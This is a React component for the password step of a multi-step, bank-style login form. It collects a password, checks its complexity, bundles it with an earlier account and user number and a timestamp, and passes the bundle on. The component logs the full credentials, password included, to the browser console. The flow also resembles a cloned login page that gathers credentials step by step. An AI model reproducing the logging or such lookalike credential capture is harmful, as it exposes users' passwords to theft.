import React, { useState } from 'react';
import { ChevronRight, FileText } from 'lucide-react';


export default function PasswordForm({ onSubmit, loginData }) {
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({});

  const handleNext = async () => {
    const newErrors = {};
    
    if (!password) {
      newErrors.password = 'Please enter your password';
    } else if (password.length > 20) {
      newErrors.password = 'Password must not exceed 20 characters';
    } else if (!/[A-Z]/.test(password)) {
      newErrors.password = 'Password must contain at least one uppercase letter';
    } else if (!/[a-z]/.test(password)) {
      newErrors.password = 'Password must contain at least one lowercase letter';
    } else if (!/[0-9]/.test(password)) {
      newErrors.password = 'Password must contain at least one number';
    } else if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
      newErrors.password = 'Password must contain at least one special character';
    }
    
    setErrors(newErrors);
    
    if (Object.keys(newErrors).length > 0) {
      return;
    }

    const step2Data = {
      ...loginData,
      password,
      step2Timestamp: new Date().toISOString()
    };
    
    console.log('Step 2 data:', step2Data);
    setIsLoading(true);
    
    setIsLoading(false);
    if (onSubmit) {
      onSubmit(step2Data);
    }
  };

  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      handleNext();
    }
  };

  return (
    <div className="bg-white rounded-lg shadow-sm p-6 lg:p-8">
      <div className="flex items-center gap-3 mb-6">
        <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center relative">
          <FileText size={24} className="text-gray-400" />
          {/* 66% progress ring around the icon */}
          <svg className="absolute inset-0 w-12 h-12 transform -rotate-90" viewBox="0 0 48 48">
            <circle
              cx="24"
              cy="24"
              r="20"
              fill="none"
              stroke="#e5e7eb"
              strokeWidth="4"
            />
            <circle
              cx="24"
              cy="24"
              r="20"
              fill="none"
              stroke="#dc2626"
              strokeWidth="4"
              strokeLinecap="round"
              strokeDasharray={`${2 * Math.PI * 20 * 0.66} ${2 * Math.PI * 20}`}
            />
          </svg>
        </div>
      </div>

      <h2 className="text-2xl font-semibold mb-4">Login details</h2>
      
      <div className="flex gap-6 mb-6 text-sm text-gray-600">
        <div className="flex items-center gap-2">
          <div className="w-5 h-5 bg-red-600 rounded-full flex items-center justify-center">
            <div className="w-2 h-2 bg-white rounded-full"></div>
          </div>
          <span className="font-semibold">Password</span>
        </div>
        <div className="flex items-center gap-2">
          <div className="w-5 h-5 border border-gray-400 rounded-full flex items-center justify-center">
            <ChevronRight size={12} />
          </div>
          <span>Log in</span>
        </div>
      </div>

      <div className="bg-gray-50 p-4 rounded mb-6 text-sm text-gray-700">
        Never share your login details with anyone
      </div>

      <div>
        {/* Show user info */}
        <div className="mb-6 p-4 bg-blue-50 rounded">
          <p className="text-sm text-gray-700">
            <span className="font-semibold">Access account:</span> {loginData?.accessNumber || 'N/A'}
          </p>
          <p className="text-sm text-gray-700">
            <span className="font-semibold">User number:</span> {loginData?.userNumber || 'N/A'}
          </p>
        </div>

        <div className="mb-6">
          <label className="block text-sm font-medium mb-2">
            Password
          </label>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onKeyPress={handleKeyPress}
            className={`w-full px-4 py-3 border rounded focus:outline-none focus:ring-2 focus:border-transparent ${
              errors.password ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-red-500'
            }`}
            placeholder="Enter your password"
            maxLength={20}
            autoFocus
          />
          {errors.password && (
            <p className="text-xs text-red-500 mt-1">{errors.password}</p>
          )}
        </div>

        <button
          onClick={handleNext}
          disabled={isLoading}
          className="w-full bg-orange-500 hover:bg-orange-600 disabled:bg-orange-300 text-white font-semibold py-3 rounded transition-colors mb-4"
        >
          {isLoading ? 'Saving...' : 'Next'}
        </button>

        <button
          type="button"
          className="w-full border-2 border-orange-500 text-orange-500 hover:bg-orange-50 font-semibold py-3 rounded transition-colors"
        >
          Forgot Password?
        </button>
      </div>
    </div>
  );
}